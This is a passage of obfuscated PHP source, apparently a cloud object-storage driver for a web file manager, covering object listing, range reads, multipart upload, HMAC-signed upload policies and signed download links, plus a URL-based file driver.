$Eø±†ô‚×ˆ = $b‰‰¶öê[33]; $cÆ…Å¶Æò’ = 1000; goto f±ÈÃØ‰½³; f±ÈÃØ‰½³: $Cæ†Œ©³ÆÎ = rtrim($a†””Ì, $b‰‰¶öê[8]) . $b‰‰¶öê[8]; $AÖ¸Ô‚Û½í = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $aÖ›èçô = $this->listObjs($a†””Ì, $Eø±†ô‚×ˆ, $cÆ…Å¶Æò’); if (!$aÖ›èçô) { return !1; } $Eø±†ô‚×ˆ = isset($aÖ›èçô[$b‰‰¶öê[1353]]) ? $aÖ›èçô[$b‰‰¶öê[1353]] : $b‰‰¶öê[33]; $Eí‹šóÊ·İ = isset($aÖ›èçô[$b‰‰¶öê[1354]]) ? $aÖ›èçô[$b‰‰¶öê[1354]] : array(); foreach ($Eí‹šóÊ·İ as $E™œÃµ‰¥‰) { $d“ê·Ó¿ì• = $E™œÃµ‰¥‰[$b‰‰¶öê[29]] == $b‰‰¶öê[77] ? !0 : !1; $e¥ö¦ß›½„ = ltrim($Cæ†Œ©³ÆÎ . $E™œÃµ‰¥‰[$b‰‰¶öê[28]], $b‰‰¶öê[8]) . ($d“ê·Ó¿ì• ? $b‰‰¶öê[8] : $b‰‰¶öê[33]); $b°¾á‰æêñ = array($b‰‰¶öê[28] => $e¥ö¦ß›½„, $b‰‰¶öê[29] => $d“ê·Ó¿ì• ? $b‰‰¶öê[77] : $b‰‰¶öê[193], $b‰‰¶öê[78] => $E™œÃµ‰¥‰[$b‰‰¶öê[344]], $b‰‰¶öê[1349] => $E™œÃµ‰¥‰[$b‰‰¶öê[1355]]); if ($AÖ¸Ô‚Û½í) { $this->cacheMethod($b‰‰¶öê[199], $e¥ö¦ß›½„, $d“ê·Ó¿ì•); $this->cacheMethod($b‰‰¶öê[200], $e¥ö¦ß›½„, $b°¾á‰æêñ); } if ($d“ê·Ó¿ì•) { $b µÏ¿‰‰À[] = $e¥ö¦ß›½„; if ($eÉ™›Ø•¾„) { $this->fileList($e¥ö¦ß›½„, $b µÏ¿‰‰À, $E ğÄÙøò, $eÉ™›Ø•¾„); } continue; } $E ğÄÙøò[] = $b°¾á‰æêñ; } if (count($Eí‹šóÊ·İ) < $cÆ…Å¶Æò’) { break; } } goto D³¢š–Š°–; D³¢š–Š°–: if ($AÖ¸Ô‚Û½í) { $this->cacheMethod($b‰‰¶öê[199], $a†””Ì, !0); } goto Eƒ¤ìÖä; Eƒ¤ìÖä: } public function listPath($bÎÂÇŞÆä‡, $Eğ…°®Õ÷… = false) { $B˜—èæ‚‹— =& $_SERVER[úÉ·öƒÑì©]; $a¬ÇÓÉÉäÏ = $fæŒÆĞ…Û = array(); $this->fileList($bÎÂÇŞÆä‡, $a¬ÇÓÉÉäÏ, $fæŒÆĞ…Û); foreach ($a¬ÇÓÉÉäÏ as $Cì­ëÌÙ¦— => $fÅ¥¡®ïÄØ) { $a¬ÇÓÉÉäÏ[$Cì­ëÌÙ¦—] = $this->folderInfo($fÅ¥¡®ïÄØ, $Eğ…°®Õ÷…); } foreach ($fæŒÆĞ…Û as $Cì­ëÌÙ¦— => $fÅ¥¡®ïÄØ) { $fæŒÆĞ…Û[$Cì­ëÌÙ¦—] = $this->fileInfo($fÅ¥¡®ïÄØ[$B˜—èæ‚‹—[28]], $Eğ…°®Õ÷…, $fÅ¥¡®ïÄØ); } return array($B˜—èæ‚‹—[75] => $a¬ÇÓÉÉäÏ, $B˜—èæ‚‹—[74] => $fæŒÆĞ…Û); } public function has($d«°´Ñ¸—·, $D¬ÓÁñ¾Ò = false, $c˜ÜìÃĞ¬ = true) { goto E‡·å±÷Ã°; E‡·å±÷Ã°: $e‚³ÁÍ„À =& $_SERVER[úÉ·öƒÑì©]; $aöØˆœÈ’é = $e‚³ÁÍ„À[33]; $f éµŞğÛâ = 500; goto Eƒ³ÓŞƒ À; FÊ•—Ö…Íô: while (!0) { check_abort(); $B‚†èõÛ‚­ = $this->listObjs($d«°´Ñ¸—·, $aöØˆœÈ’é, $f éµŞğÛâ); if (!$B‚†èõÛ‚­) { return !1; } $aöØˆœÈ’é = isset($B‚†èõÛ‚­[$e‚³ÁÍ„À[1353]]) ? $B‚†èõÛ‚­[$e‚³ÁÍ„À[1353]] : $e‚³ÁÍ„À[33]; $Dñõ«Ùì²§ = isset($B‚†èõÛ‚­[$e‚³ÁÍ„À[1354]]) ? $B‚†èõÛ‚­[$e‚³ÁÍ„À[1354]] : array(); if (empty($Dñõ«Ùì²§)) { break; } $FŠ¤¦„ø—ì = array_filter($Dñõ«Ùì²§, function ($B±°ƒÄ©ˆç) { $DŸ•Œø¹¹š =& $_SERVER[úÉ·öƒÑì©]; return $B±°ƒÄ©ˆç[$DŸ•Œø¹¹š[29]] == $DŸ•Œø¹¹š[77]; }); $b¦¾™ŒÄ” = count($Dñõ«Ùì²§); $FŠ¤¦„ø—ì = count($FŠ¤¦„ø—ì); $e¬ª¯Á‘ª¯ = $b¦¾™ŒÄ” - $FŠ¤¦„ø—ì; if ($D¬ÓÁñ¾Ò) { $e¤â¨“Ï += $FŠ¤¦„ø—ì; $aÒ‡ ®„ += $e¬ª¯Á‘ª¯; if ($b¦¾™ŒÄ” < $f éµŞğÛâ) { break; } continue; } if ($c˜ÜìÃĞ¬) { if ($e¬ª¯Á‘ª¯) { return !0; } } else { if ($FŠ¤¦„ø—ì) { return !0; } } if ($b¦¾™ŒÄ” < $f éµŞğÛâ) { break; } } if ($D¬ÓÁñ¾Ò) { return array($e‚³ÁÍ„À[203] => $aÒ‡ ®„, $e‚³ÁÍ„À[204] => $e¤â¨“Ï); } return !1; goto cëò¥ã—¸Ó; Eƒ³ÓŞƒ À: $aÒ‡ ®„ = 0; $e¤â¨“Ï = 0; $aõ­ …ƒ×ö = rtrim($d«°´Ñ¸—·, $e‚³ÁÍ„À[8]) . $e‚³ÁÍ„À[8]; goto FÊ•—Ö…Íô; cëò¥ã—¸Ó: } public function listAll($Fè¢çÈºÊÎ) { goto aÃ£íğÎ­œ; AâÀ°º­Í´: return $this->listAllFiles($Fè¢çÈºÊÎ, array_keys($a«¿¯ùĞ„¹), $a«¿¯ùĞ„¹); goto E¿¸¶À¶‡; CßáìÄ„: $a«¿¯ùĞ„¹ = array(); foreach ($D·¶¾óÚ© as $AÃ…ÑÅˆ×ï) { $a«¿¯ùĞ„¹[$AÃ…ÑÅˆ×ï[$aŸØî¥áø[28]]] = $AÃ…ÑÅˆ×ï[$aŸØî¥áø[78]]; } foreach ($D‘Íİ¡¶ as $AÃ…ÑÅˆ×ï) { if (is_string($AÃ…ÑÅˆ×ï)) { $a«¿¯ùĞ„¹[$AÃ…ÑÅˆ×ï] = 0; } } goto AâÀ°º­Í´; aÃ£íğÎ­œ: $aŸØî¥áø =& $_SERVER[úÉ·öƒÑì©]; $D‘Íİ¡¶ = $D·¶¾óÚ© = array(); $this->fileList($Fè¢çÈºÊÎ, $D‘Íİ¡¶, $D·¶¾óÚ©, !0); goto CßáìÄ„; E¿¸¶À¶‡: } public function canRead($fĞñŞ¡¼ñ¸) { return $this->exist($fĞñŞ¡¼ñ¸) ? !0 : !1; } public function canWrite($AÇÉòæœŒÀ) { return $this->exist($AÇÉòæœŒÀ) ? !0 : !1; } public function getContent($e– ÜÇåƒÁ) { return $this->fileSubstr($e– ÜÇåƒÁ, 0, -1); } public function setContent($DÒÅ­…Õ¾Š, $aô¸Åã²¦¤ = '') { $Eµ¼¿‘ˆã =& $_SERVER[úÉ·öƒÑì©]; if (!$aô¸Åã²¦¤) { $dÓÙ´êùæŠ = $this->ussRequest($DÒÅ­…Õ¾Š, $Eµ¼¿‘ˆã[224]); return $dÓÙ´êùæŠ[$Eµ¼¿‘ˆã[1094]]; } $dø¹Œ«„Í… = $this->tempFile($this->pathThis($DÒÅ­…Õ¾Š)); file_put_contents($dø¹Œ«„Í…, $aô¸Åã²¦¤); if ($this->upload($DÒÅ­…Õ¾Š, $dø¹Œ«„Í…)) { $this->tempFileRemve($dø¹Œ«„Í…); return !0; } return !1; } public function fileSubstr($E§Ş¯ˆå‹, $aááˆŒá¾‘, $B· ‘Ä‡¯œ) { $B¾ùá¦¿†¨ =& $_SERVER[úÉ·öƒÑì©]; if (!($C…ˆ«Çîˆ = $this->link($E§Ş¯ˆå‹))) { return !1; } $C‡™Ô«¯— = !1; if ($B· ‘Ä‡¯œ > 0) { $E¸ ƒõÄéÄ = $aááˆŒá¾‘ + $B· ‘Ä‡¯œ - 1; $C‡™Ô«¯— = array($B¾ùá¦¿†¨[1316] . $aááˆŒá¾‘ . $B¾ùá¦¿†¨[449] . $E¸ ƒõÄéÄ); } $d´¡Ùõäâ = url_request($C…ˆ«Çîˆ, $B¾ùá¦¿†¨[228], !1, $C‡™Ô«¯—); return $d´¡Ùõäâ[$B¾ùá¦¿†¨[726]] ? $d´¡Ùõäâ[$B¾ùá¦¿†¨[1096]] : !1; } public function upload($dé¿áòë”˜, $D¢ÜÅ¨·®’, $Fäç±§¦ = false, $F½ç›Â® = REPEAT_REPLACE) { goto FÜ¥‡Œ¤‰¬; CŠµ™óóÄ: $CøÓ™ßİ¡ƒ = 1024 * 1024 * 10; $f¨ÌîäàÇÊ = array($DÊĞø³¨‚—[1357], $DÊĞø³¨‚—[1358] . $câ‚¨Ã¦‚, $DÊĞø³¨‚—[1359], $DÊĞø³¨‚—[1360] . $CøÓ™ßİ¡ƒ); $C±ÔğÊ µ½ = $this->ussRequest($dé¿áòë”˜, $DÊĞø³¨‚—[226], !1, $f¨ÌîäàÇÊ); goto BÀçñÖ; CíÑÎ·‡±„: do { $CÔ×ÍÊ˜¥ = $Aœö—±’÷Ì[$DÊĞø³¨‚—[1362]]; fseek_64($d„š„íÂ‚Ï, $eÑ­‚ß—Šƒ); $BÓ›×„„ï– = fread($d„š„íÂ‚Ï, $CÔ×ÍÊ˜¥); $FËõöêºãò = 0; do { $FËõöêºãò++; $Aœö—±’÷Ì = $this->uploadPart($dé¿áòë”˜, $Aœö—±’÷Ì, $BÓ›×„„ï–); } while (!$Aœö—±’÷Ì && $FËõöêºãò < 3); if (!$Aœö—±’÷Ì) { return !1; } $dè¾ØšÅÎí = $Aœö—±’÷Ì[$DÊĞø³¨‚—[1361]]; $eÑ­‚ß—Šƒ += $CÔ×ÍÊ˜¥; } while ($dè¾ØšÅÎí != -1); fclose($d„š„íÂ‚Ï); $f¨ÌîäàÇÊ = array($DÊĞø³¨‚—[1363], $DÊĞø³¨‚—[1364] . $Aœö—±’÷Ì[$DÊĞø³¨‚—[1365]], $DÊĞø³¨‚—[1359]); goto açØô¿ˆÉ„; açØô¿ˆÉ„: $C±ÔğÊ µ½ = $this->ussRequest($dé¿áòë”˜, $DÊĞø³¨‚—[226], !1, $f¨ÌîäàÇÊ); return $C±ÔğÊ µ½[$DÊĞø³¨‚—[1094]] ? $this->getPathOuter($AËéŠ¤£) : !1; goto FÙç•Î Á…; FÜ¥‡Œ¤‰¬: $DÊĞø³¨‚— =& $_SERVER[úÉ·öƒÑì©]; $câ‚¨Ã¦‚ = IO::size($D¢ÜÅ¨·®’); if ($câ‚¨Ã¦‚ <= 1024 * 1024 * 200) { $f³Ñ„¦¾Ê¶ = array($DÊĞø³¨‚—[1356] . $D¢ÜÅ¨·®’); $C±ÔğÊ µ½ = $this->ussRequest($dé¿áòë”˜, $DÊĞø³¨‚—[226], $f³Ñ„¦¾Ê¶); return $C±ÔğÊ µ½[$DÊĞø³¨‚—[1094]] ? $this->getPathOuter($dé¿áòë”˜) : !1; } goto CŠµ™óóÄ; Dß•›‘ÊçÃ: $dè¾ØšÅÎí = $Aœö—±’÷Ì[$DÊĞø³¨‚—[1361]]; $d„š„íÂ‚Ï = fopen($D¢ÜÅ¨·®’, $DÊĞø³¨‚—[1266]); if (!$d„š„íÂ‚Ï) { return !1; } goto CíÑÎ·‡±„; BÀçñÖ: if (!$C±ÔğÊ µ½[$DÊĞø³¨‚—[1094]]) { return !1; } $Aœö—±’÷Ì = $C±ÔğÊ µ½[$DÊĞø³¨‚—[1096]]; $eÑ­‚ß—Šƒ = 0; goto Dß•›‘ÊçÃ; FÙç•Î Á…: } private function uploadPart($fŒ®å˜½ƒÚ, $cçáÜ¶íÁ¤, &$a¬î«ŠÊË³) { $d¹ÖÒòƒ¿ =& $_SERVER[úÉ·öƒÑì©]; $c ›¼ƒç‚Ğ = array($d¹ÖÒòƒ¿[1366], $d¹ÖÒòƒ¿[1364] . $cçáÜ¶íÁ¤[$d¹ÖÒòƒ¿[1365]], $d¹ÖÒòƒ¿[1367] . $cçáÜ¶íÁ¤[$d¹ÖÒòƒ¿[1361]], $d¹ÖÒòƒ¿[141] . $cçáÜ¶íÁ¤[$d¹ÖÒòƒ¿[1362]]); $Cã„åÆ—óí = $this->ussRequest($fŒ®å˜½ƒÚ, $d¹ÖÒòƒ¿[226], $a¬î«ŠÊË³, $c ›¼ƒç‚Ğ); return !$Cã„åÆ—óí[$d¹ÖÒòƒ¿[1094]] ? $Cã„åÆ—óí[$d¹ÖÒòƒ¿[1094]] : $Cã„åÆ—óí[$d¹ÖÒòƒ¿[1096]]; } public function uploadFormData($bë²˜ Õ«“, $c‘—›ã¸Æƒ = 3600) { return $this->uploadPolicy($bë²˜ Õ«“, $c‘—›ã¸Æƒ); } public function multiUploadFormData($C§—Õ·ŸùÙ, $fËî¡í— = 3600) { $AƒšÀ—–Šø =& $_SERVER[úÉ·öƒÑì©]; $e»¡›¬ã¤ = (int) $GLOBALS[$AƒšÀ—–Šø[7]][$AƒšÀ—–Šø[78]]; return $this->uploadPolicy($C§—Õ·ŸùÙ, $fËî¡í—, $e»¡›¬ã¤); } private function uploadPolicy($c—‹Ë•‹¼Ò, $Dï»ñ³Ü×é = 3600, $bÃ’Î÷Òø­ = 0) { goto C“ß¢ÍÈÌ; b°ºø°‘ÕÃ: $d„ì§¯àÜ = array($D¼àÕä…ßõ[1368] => $this->bucket, $D¼àÕä…ßõ[1369] => $c—‹Ë•‹¼Ò, $D¼àÕä…ßõ[1370] => time() + $Dï»ñ³Ü×é, $D¼àÕä…ßõ[1371] => $cÆÙÁÉ™º©); if ($bÃ’Î÷Òø­) { $d„ì§¯àÜ[$D¼àÕä…ßõ[1282]] = $bÃ’Î÷Òø­; } $C†ª×Â…•Ù = base64_encode(json_encode($d„ì§¯àÜ)); goto D°Êê¡Ñ£‡; D°Êê¡Ñ£‡: $Cİå¤Áƒäã = base64_encode(hash_hmac($D¼àÕä…ßõ[1338], "\x50\117\123\124\46{$f— ³ øë—}\46{$cÆÙÁÉ™º©}\x26{$C†ª×Â…•Ù}", md5("{$this->userpass}"), !0)); $d¹¨”“ëãÈ = array($D¼àÕä…ßõ[1208] => $C†ª×Â…•Ù, $D¼àÕä…ßõ[1372] => "\x55\x50\131\x55\116\40{$this->username}\x3a{$Cİå¤Áƒäã}", $D¼àÕä…ßõ[175] => $this->endpoint . $f— ³ øë—); return $d¹¨”“ëãÈ; goto f­ƒõï’Ï; C“ß¢ÍÈÌ: $D¼àÕä…ßõ =& $_SERVER[úÉ·öƒÑì©]; $f— ³ øë— = $D¼àÕä…ßõ[8] . $this->bucket; $cÆÙÁÉ™º© = gmdate($D¼àÕä…ßõ[1303]); goto b°ºø°‘ÕÃ; f­ƒõï’Ï: } public function download($Eùâ—í’, $cÛ¹ÂŠˆè­) { goto Fæé‰Éé­è; Fæé‰Éé­è: $Dì¯æ·ïÉ = IO::getPathInner(IO::mkfile($cÛ¹ÂŠˆè­)); if (!($E¦×†Ã‚Ÿ´ = $this->link($Eùâ—í’))) { return !1; } $d³»ªƒ¼÷ã = 0; goto eœŠîŞ‚; a¯Ã‚ÎÁêí: fclose($E¬õ¹Œ¢™­); return $cÛ¹ÂŠˆè­; goto aÁ–”®óÆ; eœŠîŞ‚: $c¤ÜíªğÒ = 1024 * 200; $E¬õ¹Œ¢™­ = fopen($Dì¯æ·ïÉ, $_SERVER[úÉ·öƒÑì©][1322]); while (!0) { $C¸›È´¦“® = $this->fileSubstr($Eùâ—í’, $d³»ªƒ¼÷ã, $c¤ÜíªğÒ); if ($C¸›È´¦“® === !1) { return !1; } fwrite($E¬õ¹Œ¢™­, $C¸›È´¦“®); $d³»ªƒ¼÷ã += $c¤ÜíªğÒ; if (strlen($C¸›È´¦“®) < $c¤ÜíªğÒ) { break; } } goto a¯Ã‚ÎÁêí; aÁ–”®óÆ: } public function link($eÀœÉŸ”, $c§Ğõ²õ²š = array()) { $B…İ˜°è¨Ù =& $_SERVER[úÉ·öƒÑì©]; $eÀœÉŸ” = trim($eÀœÉŸ”, $B…İ˜°è¨Ù[8]); if (!empty($this->token)) { $D¸ğ’¾ô = strtotime(date($B…İ˜°è¨Ù[1373])); $EÕ‹Å”Ù = substr(md5($this->token . $B…İ˜°è¨Ù[291] . $D¸ğ’¾ô . $B…İ˜°è¨Ù[1374] . $eÀœÉŸ”), 12, 8) . $D¸ğ’¾ô; $c§Ğõ²õ²š[] = $B…İ˜°è¨Ù[1375] . $EÕ‹Å”Ù; } $bâË™Àªô¿ = !empty($c§Ğõ²õ²š) ? $B…İ˜°è¨Ù[70] . implode($B…İ˜°è¨Ù[291], $c§Ğõ²õ²š) : $B…İ˜°è¨Ù[33]; return $this->getHost() . $B…İ˜°è¨Ù[8] . $eÀœÉŸ” . $bâË™Àªô¿; } public function fileOut($f…‘¾‹™ˆÂ, $e“é˜æ•Åì = false, $AŞø×Ğ¥‰ = false, $Eì±ê‚²ÏÑ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($f…‘¾‹™ˆÂ, $e“é˜æ•Åì, $AŞø×Ğ¥‰, $Eì±ê‚²ÏÑ); } if (!$AŞø×Ğ¥‰) { $AŞø×Ğ¥‰ = $this->pathThis($f…‘¾‹™ˆÂ); } $b¦¶‘™»… = $e“é˜æ•Åì ? array($_SERVER[úÉ·öƒÑì©][1376] . rawurlencode($AŞø×Ğ¥‰)) : array(); $eîÂáˆ¤Û = $this->link($f…‘¾‹™ˆÂ, $b¦¶‘™»…); $this->fileOutLink($eîÂáˆ¤Û); } public function fileOutServer($B¬È¢²ö’µ, $E‘×øô×Í­ = false, $D‘”´ Ì‰ = false, $b­…‡Ø§ = '') { parent::fileOut($B¬È¢²ö’µ, $E‘×øô×Í­, $D‘”´ Ì‰, $b­…‡Ø§); } public function fileOutImage($b‰È­Öù¯, $C×åÇ¾½ßä = 250) { $AÇÂ¹œà‹® = $this->link($b‰È­Öù¯ . $_SERVER[úÉ·öƒÑì©][1377] . $C×åÇ¾½ßä); $this->fileOutLink($AÇÂ¹œà‹®); } public function fileOutImageServer($e™îâ«‘ø, $DÈ®ƒŞÙ’ª = 250) { parent::fileOutImage($e™îâ«‘ø, $DÈ®ƒŞÙ’ª); } public function hashMd5($c“ºŒí¦Üæ) { $B®¤öã’ˆë =& $_SERVER[úÉ·öƒÑì©]; $Dµ¹œøÙÒ = $this->_objectMeta($c“ºŒí¦Üæ); return isset($Dµ¹œøÙÒ[$B®¤öã’ˆë[208]]) ? $Dµ¹œøÙÒ[$B®¤öã’ˆë[208]] : !1; } public function size($CÅ…¢ö º) { $CÃŸÜŞŠ— = $this->objectMeta($CÅ…¢ö º); return $CÃŸÜŞŠ— ? $CÃŸÜŞŠ—[$_SERVER[úÉ·öƒÑì©][78]] : 0; } public function info($fî­æÓ³ø) { if ($this->isFolder($fî­æÓ³ø)) { return $this->folderInfo($fî­æÓ³ø); } else { if ($this->isFile($fî­æÓ³ø)) { return $this->fileInfo($fî­æÓ³ø); } } return !1; } public function exist($CŒœ®ÚàÆ‘) { return $this->isFile($CŒœ®ÚàÆ‘) || $this->isFolder($CŒœ®ÚàÆ‘); } public function isFile($aâÉ¸ß…ßğ) { return !$this->isFolder($aâÉ¸ß…ßğ) && $this->objectMeta($aâÉ¸ß…ßğ); } public function isFolder($e°ÏÙ˜æ) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][199], $e°ÏÙ˜æ); } protected function objectMeta($Fæ‘•÷¶º´) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][200], $Fæ‘•÷¶º´); } protected function _objectMeta($A‘ªÈåŠ¸) { goto fÉ¤áÏŠ„; Fî»Æ’çÔÏ: $B‹íËòì’ = array($c‘äĞ÷¿ÙÉ[29] => isset($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1379]]) ? $CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1379]] : null, $c‘äĞ÷¿ÙÉ[78] => isset($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1380]]) ? $CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1380]] : null, $c‘äĞ÷¿ÙÉ[208] => isset($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1381]]) ? $CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1381]] : null, $c‘äĞ÷¿ÙÉ[1348] => isset($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1382]]) ? $CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1382]] : null); $B‹íËòì’[$c‘äĞ÷¿ÙÉ[1349]] = isset($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1383]]) ? strtotime($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1383]]) : $B‹íËòì’[$c‘äĞ÷¿ÙÉ[1348]]; return $B‹íËòì’; goto AôÔòÊö²Ô; fÉ¤áÏŠ„: $c‘äĞ÷¿ÙÉ =& $_SERVER[úÉ·öƒÑì©]; if ($A‘ªÈåŠ¸ == $c‘äĞ÷¿ÙÉ[33] || $A‘ªÈåŠ¸ == $c‘äĞ÷¿ÙÉ[8]) { return array(); } $C¶»„‘‘Ô = $this->ussRequest($A‘ªÈåŠ¸, $c‘äĞ÷¿ÙÉ[1378]); goto EÃÑÂÓ”Œ; EÃÑÂÓ”Œ: if (!$C¶»„‘‘Ô[$c‘äĞ÷¿ÙÉ[1094]]) { return null; } $CŠàÒºÂ¸² = isset($C¶»„‘‘Ô[$c‘äĞ÷¿ÙÉ[1096]]) ? $C¶»„‘‘Ô[$c‘äĞ÷¿ÙÉ[1096]] : array(); if (!isset($CŠàÒºÂ¸²[$c‘äĞ÷¿ÙÉ[1379]])) { return null; } goto Fî»Æ’çÔÏ; AôÔòÊö²Ô: } protected function _isFolder($BïŠ—ˆ¯†½) { $b×áœÒµĞ† =& $_SERVER[úÉ·öƒÑì©]; if ($BïŠ—ˆ¯†½ == $b×áœÒµĞ†[33] || $BïŠ—ˆ¯†½ == $b×áœÒµĞ†[8]) { return !0; } $dêÉİÂêõÚ = $this->_objectMeta($BïŠ—ˆ¯†½); return isset($dêÉİÂêõÚ[$b×áœÒµĞ†[29]]) && $dêÉİÂêõÚ[$b×áœÒµĞ†[29]] == $b×áœÒµĞ†[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($EãÑ×à‰Ğ = false) { } public function exist($FˆŞì›‰ˆ) { $fÍ£Áê¾õ = $this->info($FˆŞì›‰ˆ); return $fÍ£Áê¾õ[$_SERVER[úÉ·öƒÑì©][195]]; } public function isFile($D¤¢©Øßˆ) { $C›µ‡‡³ÀÓ = $this->info($D¤¢©Øßˆ); return $C›µ‡‡³ÀÓ[$_SERVER[úÉ·öƒÑì©][195]]; } public function isFolder($bòà«ê¥Æ¤) { return !1; } public function size($Fõ÷Ò©™’•) { $cÂ Ì„ŠÔé = $this->info($Fõ÷Ò©™’•); return $cÂ Ì„ŠÔé[$_SERVER[úÉ·öƒÑì©][78]]; } public function info($C‚”æ‘š—) { return $this->infoParse($C‚”æ‘š—); } public function infoAuth($bÍ¶ƒŠÅ¶) { return $this->infoParse($bÍ¶ƒŠÅ¶); } public function infoWithChildren($Aæ·°’Ö) { return $this->infoParse($Aæ·°’Ö); } public function infoFull($D±¾²‘) { return $this->infoParse($D±¾²‘); } private function infoParse($AìĞ…‰´„º) { $dåªƒÅ¯¾ó =& $_SERVER[úÉ·öƒÑì©]; $e¸–ì˜ëÚ¦ = $this->header($AìĞ…‰´„º); if (!$e¸–ì˜ëÚ¦ || !$e¸–ì˜ëÚ¦[$dåªƒÅ¯¾ó[726]]) { return !1; } $e²¨…¦Œ¸ = _get($e¸–ì˜ëÚ¦, $dåªƒÅ¯¾ó[344], 0); $Dñƒö«ˆ‡Ÿ = array($dåªƒÅ¯¾ó[28] => $e¸–ì˜ëÚ¦[$dåªƒÅ¯¾ó[28]], $dåªƒÅ¯¾ó[76] => $AìĞ…‰´„º, $dåªƒÅ¯¾ó[29] => $dåªƒÅ¯¾ó[193], $dåªƒÅ¯¾ó[78] => intval($e²¨…¦Œ¸), $dåªƒÅ¯¾ó[168] => get_path_ext($e¸–ì˜ëÚ¦[$dåªƒÅ¯¾ó[28]]), $dåªƒÅ¯¾ó[1263] => $e²¨…¦Œ¸ > 0 && $e¸–ì˜ëÚ¦[$dåªƒÅ¯¾ó[1384]], $dåªƒÅ¯¾ó[1264] => !1); return $Dñƒö«ˆ‡Ÿ; } private function header($eŠàé¥¶Ô”) { goto b·Èß¯ĞÙ; b·Èß¯ĞÙ: $fÌŒĞÃ»§ª =& $_SERVER[úÉ·öƒÑì©]; if (isset(self::$_cacheHeader[$eŠàé¥¶Ô”])) { return self::$_cacheHeader[$eŠàé¥¶Ô”]; } $cÎ¡÷Ï“¿¦ = isset($GLOBALS[$fÌŒĞÃ»§ª[1385]]) ? $GLOBALS[$fÌŒĞÃ»§ª[1385]] : !1; goto AŒœˆ×íé; CÚ›ÖÒˆ: return self::$_cacheHeader[$eŠàé¥¶Ô”]; goto EÕìˆöÕ•Ö; AŒœˆ×íé: $GLOBALS[$fÌŒĞÃ»§ª[1385]] = !0; self::$_cacheHeader[$eŠàé¥¶Ô”] = url_header($eŠàé¥¶Ô”); $GLOBALS[$fÌŒĞÃ»§ª[1385]] = $cÎ¡÷Ï“¿¦; goto CÚ›ÖÒˆ; EÕìˆöÕ•Ö: } public function hashSimple($a‹İÔĞ‰ç, $B¹”¤˜Û‚  = false) { goto Cˆó²åäƒø; cè¦øˆãÂ: if ($CÏñ×¾ÛÚí <= $CåÌ‡ƒº¤ç * $A•šØ¶çˆù) { return md5($this->fileSubstr($a‹İÔĞ‰ç, 0, $CÏñ×¾ÛÚí)) . $CÏñ×¾ÛÚí; } $a­ÜŒË ò = intval($CÏñ×¾ÛÚí / $A•šØ¶çˆù); $f‘ğÙ÷Ò˜Ü = $BÊšğÁø®[33]; goto D”È¹¤—; bÈ†Æ¸Ñëá: $f‘ğÙ÷Ò˜Ü .= $this->fileSubstr($a‹İÔĞ‰ç, $CÏñ×¾ÛÚí - $CåÌ‡ƒº¤ç, $CåÌ‡ƒº¤ç); return md5($f‘ğÙ÷Ò˜Ü) . $CÏñ×¾ÛÚí; goto cô¾Ÿ‰ï¹ê; D”È¹¤—: $CÅôéÎÌÍ˜ = timeFloat(); $C‹êÀáê = 15; for ($Eì†ƒÖàëë = 0; $Eì†ƒÖàëë < $A•šØ¶çˆù; $Eì†ƒÖàëë++) { if (timeFloat() - $CÅôéÎÌÍ˜ > $C‹êÀáê) { return !1; } $d’†Ú‰»Ğˆ = $this->fileSubstr($a‹İÔĞ‰ç, $a­ÜŒË ò * $Eì†ƒÖàëë, $CåÌ‡ƒº¤ç); if (!$d’†Ú‰»Ğˆ) { return !1; } $f‘ğÙ÷Ò˜Ü .= $d’†Ú‰»Ğˆ; } goto bÈ†Æ¸Ñëá; Cˆó²åäƒø: $BÊšğÁø® =& $_SERVER[úÉ·öƒÑì©]; $AÕ©‡ïõÑ = $this->info($a‹İÔĞ‰ç); if (!$AÕ©‡ïõÑ || !$AÕ©‡ïõÑ[$BÊšğÁø®[195]]) { return !1; } goto b¤Æ¿Ø; b¤Æ¿Ø: $CÏñ×¾ÛÚí = $AÕ©‡ïõÑ[$BÊšğÁø®[78]]; $CåÌ‡ƒº¤ç = 200; $A•šØ¶çˆù = 50; goto cè¦øˆãÂ; cô¾Ÿ‰ï¹ê: } public function getContent($bÆ®±£‹É) { return $this->fileSubstr($bÆ®±£‹É); } public function fileSubstr($EÙ°‰†ô¯„, $c×ÏÜÅ—Ê¿ = 0, $D­«ïÉÍ¬» = -1) { goto Dä¥®½í; cª˜í°†ãÊ: if ($D­«ïÉÍ¬» === -1) { $D­«ïÉÍ¬» = $BŠÖŠ†¯áˆ[$E÷ã¦¨ô”[78]]; } if ($D­«ïÉÍ¬» == 0) { return $E÷ã¦¨ô”[33]; } $cÜ“ĞÄŸÇß = array($E÷ã¦¨ô”[1386] . $c×ÏÜÅ—Ê¿ . $E÷ã¦¨ô”[760] . ($c×ÏÜÅ—Ê¿ + $D­«ïÉÍ¬» - 1)); goto Dğ¸×¼½“; Dä¥®½í: $E÷ã¦¨ô” =& $_SERVER[úÉ·öƒÑì©]; $BŠÖŠ†¯áˆ = $this->info($EÙ°‰†ô¯„); if (!$BŠÖŠ†¯áˆ || !$BŠÖŠ†¯áˆ[$E÷ã¦¨ô”[195]] && $BŠÖŠ†¯áˆ[$E÷ã¦¨ô”[78]] > 1024 * 1024 * 10) { return !1; } goto cª˜í°†ãÊ; Dğ¸×¼½“: $Fµœ‹¾‰Ú = url_request($EÙ°‰†ô¯„, $E÷ã¦¨ô”[228], !1, $cÜ“ĞÄŸÇß, !1, !1, 1); return $Fµœ‹¾‰Ú[$E÷ã¦¨ô”[1096]] ? $Fµœ‹¾‰Ú[$E÷ã¦¨ô”[1096]] : $E÷ã¦¨ô”[33]; goto D‘ˆÃƒÇß³; D‘ˆÃƒÇß³: } public function download($c£Ñ’”È²ƒ, $e¼—œÁ ¥) { 